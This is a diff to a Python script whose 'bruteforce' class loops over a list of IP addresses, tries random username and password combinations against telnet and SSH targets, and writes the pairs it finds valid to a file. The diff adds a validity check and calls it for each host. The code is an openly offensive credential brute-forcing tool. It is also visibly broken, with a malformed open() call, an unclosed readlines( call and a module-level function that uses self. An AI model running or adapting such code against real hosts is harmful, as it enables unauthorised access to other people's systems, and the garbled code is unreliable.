@@ -92,7 +92,8 @@ class bruteforce:
 			return (
 				"\033[35m" + self.ip + ":" + self.port + "\033[0m is \033[31mnot valid\033[0m!\033[35m 'critical error'\033[0m!"
 				)
-	def check_validity():
+def check_validity():
+	if sfw_combo != "null":
 		try:
 			with open("telnet_list.txt", "ssh_list.txt", "r" ) as check_validity:
 				is_valid = check_validity.readlines(
@@ -104,7 +105,10 @@ class bruteforce:
 				data.write(self.user+ ":"+ self.pasw + " " + is_valid
 					)
 		except:
-			return		
+			return
+	else:
+		print("\033[31mCritical Error!\033[0m exit code 2")
+		sys.exit()	
 
 # start the bruteforce
 print("\033[H\033[J")
@@ -114,6 +118,7 @@ for single_ip in sfw_combo:
 	random_passw = random.choice(combo_passw)
 	config = (bruteforce(single_ip, port, random_user, random_passw))
 	print(config.is_usable())
+	check_validity()	
 	time.sleep(timeout_int)
 
 # exit code 0
